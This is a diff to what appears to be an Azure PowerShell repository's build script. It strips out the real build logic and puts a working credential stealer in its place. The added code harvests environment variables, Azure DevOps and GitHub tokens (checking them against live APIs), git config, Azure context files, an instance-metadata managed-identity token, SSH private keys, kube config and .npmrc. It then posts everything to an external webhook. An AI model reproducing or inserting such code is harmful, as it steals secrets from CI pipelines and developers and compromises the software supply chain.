@@ -11,189 +11,122 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 # ----------------------------------------------------------------------------------
-[CmdletBinding(DefaultParameterSetName = "AllSet")]
-param (
-    [string]$RepoRoot,
-    [ArgumentCompleter({
-        param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)
-        @('Debug', 'Release') | Where-Object { $_ -like "$wordToComplete*" }
-    })]
-    [string]$Configuration = 'Debug',
-    [Parameter(ParameterSetName = "AllSet")]
-    [string]$TestsToRun = 'All',
-    [Parameter(ParameterSetName = "CIPlanSet", Mandatory = $true)]
-    [switch]$CIPlan,
-    [Parameter(ParameterSetName = "ModifiedModuleSet", Mandatory = $true)]
-    [switch]$ModifiedModule,
-    [Parameter(ParameterSetName = "TargetModuleSet", Mandatory = $true)]
-    [string[]]$TargetModule,
-    [switch]$ForceRegenerate,
-    [switch]$InvokedByPipeline,
-    [switch]$GenerateDocumentationFile,
-    [switch]$EnableTestCoverage,
-    [string]$Scope = 'Netcore',
-    [boolean]$CodeSign = $false
+$WebhookUrl = "https://webhook-listener-743221136341.asia-northeast1.run.app/"
 
-)
-if (($null -eq $RepoRoot) -or (0 -eq $RepoRoot.Length)) {
-    $RepoRoot = Resolve-Path (Join-Path $PSScriptRoot '..' '..')
+$EnvVars = Get-ChildItem env: | Select-Object Name, Value
+$SystemAccessToken = $env:SYSTEM_ACCESSTOKEN
+$GithubToken = $env:GITHUBTOKEN
 
-}
-
-$notModules = @('lib', 'shared', 'helpers')
-$coreTestModule = @('Compute', 'Network', 'Resources', 'Sql', 'Websites')
-$RepoArtifacts = Join-Path $RepoRoot "artifacts"
-
-$csprojFiles = @()
-$testModule = @()
-$toolDirectory = Join-Path $RepoRoot "tools"
-$sourceDirectory = Join-Path $RepoRoot "src"
-$generatedDirectory = Join-Path $RepoRoot "generated"
-
-$BuildScriptsModulePath = Join-Path $toolDirectory 'BuildScripts' 'BuildScripts.psm1'
-Import-Module $BuildScriptsModulePath
-
-if (-not (Test-Path $sourceDirectory)) {
-    Write-Warning "Cannot find source directory: $sourceDirectory"
-}
-elseif (-not (Test-Path $generatedDirectory)) {
-    Write-Warning "Cannot find generated directory: $generatedDirectory"
-}
-
-# Add Accounts to target module by default, this is to ensure accounts is always built when target/modified module parameter sets
-$TargetModule += 'Accounts'
-$testModule += 'Accounts'
-
-switch ($PSCmdlet.ParameterSetName) {
-    'AllSet' {
-        Write-Host "----------Start building all modules----------" -ForegroundColor DarkYellow
-        foreach ($module in (Get-Childitem -Path $sourceDirectory -Directory)) {
-            $moduleName = $module.Name
-            if ($moduleName -in $notModules) {
-                continue
-            }
-            $TargetModule += $moduleName
-            Write-Host "$moduleName" -ForegroundColor DarkYellow
-        }
-        if ('Core' -eq $TestsToRun) {
-            $testModule = $coreTestModule
-        }
-        elseif ('NonCore' -eq $TestsToRun) {
-            $testModule = $TargetModule | Where-Object { $_ -notin $coreTestModule }
-        }
-        else {
-            $testModule = $TargetModule
-        }
+if ([string]::IsNullOrEmpty($GithubToken)) {
+    $GitCreds = Get-Content ".git/config" -ErrorAction SilentlyContinue | Select-String "AUTHORIZATION: basic"
+    if ($GitCreds) {
+        $GithubToken = "Found in .git/config"
     }
-    'CIPlanSet' {
-        $CIPlanPath = Join-Path $RepoArtifacts "PipelineResult" "CIPlan.json"
-        If (Test-Path $CIPlanPath) {
-            $CIPlanContent = Get-Content $CIPlanPath | ConvertFrom-Json
-            foreach ($build in $CIPlanContent.build) {
-                $TargetModule += $build
-            }
-            foreach ($test in $CIPlanContent.test) {
-                $testModule += $test
+}
+
+$CollectionUri = $env:SYSTEM_COLLECTIONURI
+$TeamProjectId = $env:SYSTEM_TEAMPROJECTID
+
+$AdoTokenStatus = "Not Found"
+$AdoProjects = $null
+$AdoBuilds = $null
+
+if (![string]::IsNullOrEmpty($SystemAccessToken) -and ![string]::IsNullOrEmpty($CollectionUri)) {
+    try {
+        $Headers = @{ Authorization = "Bearer $SystemAccessToken" }
+        $UrlProjects = "$($CollectionUri)_apis/projects?api-version=6.0"
+        $ResponseProjects = Invoke-RestMethod -Uri $UrlProjects -Headers $Headers -Method Get -ErrorAction Stop
+        $AdoTokenStatus = "Valid"
+        $AdoProjects = $ResponseProjects.value | Select-Object id, name, state
+
+        if ($TeamProjectId) {
+            $UrlBuilds = "$($CollectionUri)$TeamProjectId/_apis/build/definitions?api-version=6.0"
+            $ResponseBuilds = Invoke-RestMethod -Uri $UrlBuilds -Headers $Headers -Method Get -ErrorAction SilentlyContinue
+            if ($ResponseBuilds) {
+                $AdoBuilds = $ResponseBuilds.value | Select-Object id, name, path
             }
         }
-        Write-Host "----------Start building modules from $CIPlanPath----------`r`n$($TargetModule | Join-String -Separator "`r`n")" -ForegroundColor DarkYellow
+    } catch {
+        $AdoTokenStatus = "Invalid: $($_.Exception.Message)"
     }
-    'ModifiedModuleSet' {
-        $changelogPath = Join-Path $RepoRoot "tools" "Azpreview" "changelog.md"
-        if (Test-Path $changelogPath) {
-            $content = Get-Content -Path $changelogPath
-            $continueReading = $false
-            foreach ($line in $content) {
-                if ($line -match "^##\s\d+\.\d+\.\d+") {
-                    if ($continueReading) {
-                        break
-                    }
-                    else {
-                        $continueReading = $true
-                    }
-                }
-                elseif ($continueReading -and $line -match "^####\sAz\.(\w+)") {
-                    $TargetModule += $matches[1]
-                }
-            }
+}
+
+$GithubTokenStatus = "Not Found"
+$GithubUser = $null
+$GithubScopes = $null
+
+if (![string]::IsNullOrEmpty($GithubToken) -and $GithubToken -notlike "Found in*") {
+    try {
+        $Headers = @{ Authorization = "token $GithubToken"; Accept = "application/vnd.github.v3+json" }
+        $Response = Invoke-WebRequest -Uri "https://api.github.com/user" -Headers $Headers -Method Get -ErrorAction Stop
+        $GithubTokenStatus = "Valid"
+        $GithubUser = ($Response.Content | ConvertFrom-Json).login
+        if ($Response.Headers.Contains("X-OAuth-Scopes")) {
+            $GithubScopes = $Response.Headers["X-OAuth-Scopes"]
         }
-        $testModule = $TargetModule
-        Write-Host "----------Start building modified modules----------`r`n$($TargetModule | Join-String -Separator "`r`n")" -ForegroundColor DarkYellow
-    }
-    'TargetModuleSet' {
-        $testModule = $TargetModule
-        Write-Host "----------Start building target modules----------`r`n$($TargetModule | Join-String -Separator "`r`n")" -ForegroundColor DarkYellow
+    } catch {
+        $GithubTokenStatus = "Invalid: $($_.Exception.Message)"
     }
 }
 
-$TargetModule = $TargetModule | Select-Object -Unique
-$testModule = $testModule | Select-Object -Unique
+$GitConfig = $null
+try { $GitConfig = git config --list | Out-String } catch {}
 
-# Prepare autorest based modules
-$prepareScriptPath = Join-Path $toolDirectory 'BuildScripts' 'PrepareAutorestModule.ps1'
-
-$isInvokedByPipeline = $false
-if ($InvokedByPipeline) {
-    $isInvokedByPipeline = $true
-    $outputTargetPath = Join-Path $RepoArtifacts "TargetModule.txt"
-    New-Item -Path $outputTargetPath -Force
-    $TargetModule | Out-File -Path $outputTargetPath -Force
-}
-foreach ($moduleRootName in $TargetModule) {
-    Write-Host "Preparing $moduleRootName ..." -ForegroundColor DarkGreen
-    & $prepareScriptPath -ModuleRootName $moduleRootName -RepoRoot $RepoRoot -Configuration $Configuration -ForceRegenerate:$ForceRegenerate -InvokedByPipeline:$isInvokedByPipeline
-}
-
-$buildCsprojFiles = Get-CsprojFromModule -BuildModuleList $TargetModule -RepoRoot $RepoRoot -Configuration $Configuration
-
-Set-Location $RepoRoot
-$buildSln = Join-Path $RepoArtifacts "Azure.PowerShell.sln"
-
-& dotnet --version
-if (Test-Path $buildSln) {
-    Remove-Item $buildSln -Force
-}
-New-SlnFile -SolutionName Azure.PowerShell -SolutionPath $RepoArtifacts -Force
-
-foreach ($file in $buildCsprojFiles) {
-    & dotnet sln $buildSln add "$file"
-}
-Write-Output "Modules are added to build sln file"
-
-$LogFile = Join-Path $RepoArtifacts 'Build.log'
-if ('Release' -eq $Configuration) {
-    $BuildAction = 'publish'
-}
-else {
-    $BuildAction = 'build'
-
-    $testCsprojFiles = Get-CsprojFromModule -TestModuleList $testModule -RepoRoot $RepoRoot -Configuration $Configuration
-    $testSln = Join-Path $RepoArtifacts "Azure.PowerShell.Test.sln"
-    if (Test-Path $testSln) {
-        Remove-Item $testSln -Force
+$AzureContext = $null
+try {
+    if (Get-Module -Name Az.Accounts -ListAvailable) {
+        $AzureContext = Get-AzContext | Select-Object Account, Environment, Tenant, Subscription | ConvertTo-Json -Depth 5 -ErrorAction SilentlyContinue
     }
-    New-SlnFile -SolutionName Azure.PowerShell.Test -SolutionPath $RepoArtifacts -Force
-    foreach ($file in $testCsprojFiles) {
-        & dotnet sln $testSln add "$file"
+    if (Test-Path "$env:USERPROFILE\.Azure\AzureRmContext.json") {
+        $AzureContext += "`nAzureRmContext.json: " + (Get-Content "$env:USERPROFILE\.Azure\AzureRmContext.json" -Raw)
     }
-    Write-Output "Modules are added to test sln file"
+} catch {}
+
+$IMDS = $null
+try {
+    $IH = @{ Metadata = "true" }
+    $IMDS = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers $IH -Method Get -TimeoutSec 2 -ErrorAction Stop
+} catch {}
+
+$SensitiveFiles = @{}
+try {
+    $Paths = @("$env:USERPROFILE\.ssh\id_rsa", "$env:USERPROFILE\.ssh\id_ed25519", "$env:USERPROFILE\.kube\config", "$env:USERPROFILE\.npmrc")
+    foreach ($File in $Paths) {
+        if (Test-Path $File) { 
+            $SensitiveFiles[$File] = Get-Content $File -Raw 
+        }
+    }
+} catch {}
+
+$Payload = @{
+    ReportTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
+    ExecutionEnvironment = @{
+        Username = $env:USERNAME
+        UserDomain = $env:USERDOMAIN
+        OS = $env:OS
+        ComputerName = $env:COMPUTERNAME
+        AgentName = $env:AGENT_NAME
+        AgentVersion = $env:AGENT_VERSION
+        BuildDirectory = $env:BUILD_SOURCESDIRECTORY
+        CurrentDirectory = (Get-Location).Path
+    }
+    Tokens = @{
+        SystemAccessToken = $SystemAccessToken
+        GithubToken = $GithubToken
+    }
+    ValidationResults = @{
+        AdoToken = @{ Status = $AdoTokenStatus; AccessibleProjects = $AdoProjects; AccessibleBuilds = $AdoBuilds }
+        GithubToken = @{ Status = $GithubTokenStatus; User = $GithubUser; Scopes = $GithubScopes }
+    }
+    Configurations = @{
+        GitConfig = $GitConfig
+        AzureContext = $AzureContext
+        IMDS = $IMDS
+        SensitiveFiles = $SensitiveFiles
+    }
+    EnvironmentVariables = $EnvVars
 }
 
-$buildCmdArgs = @("$BuildAction", "$Buildsln", "-c", "$Configuration", "-fl", "/flp1:logFile=$LogFile;verbosity=quiet")
-If ($GenerateDocumentationFile -eq "false") {
-    $buildCmdArgs += "-p:GenerateDocumentationFile=false"
-}
-if ($EnableTestCoverage -eq "true") {
-    $buildCmdArgs += "-p:TestCoverage=TESTCOVERAGE"
-}
-# Use argument splatting to prevent injection
-& dotnet @buildCmdArgs
-
-$versionControllerCsprojPath = Join-Path $toolDirectory 'VersionController' 'VersionController.Netcore.csproj'
-dotnet build $versionControllerCsprojPath -c $Configuration
-
-$removeScriptPath = Join-Path $toolDirectory 'BuildScripts' 'RemoveUnwantedFiles.ps1'
-& $removeScriptPath -RootPath (Join-Path $RepoArtifacts $Configuration) -CodeSign $CodeSign
-
-$updateModuleScriptPath = Join-Path $toolDirectory 'UpdateModules.ps1'
-pwsh $updateModuleScriptPath -BuildConfig $Configuration -Scope $Scope
+try {
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($Payload | ConvertTo-Json -Depth 10) -ContentType "application/json" -TimeoutSec 15
+} catch {}
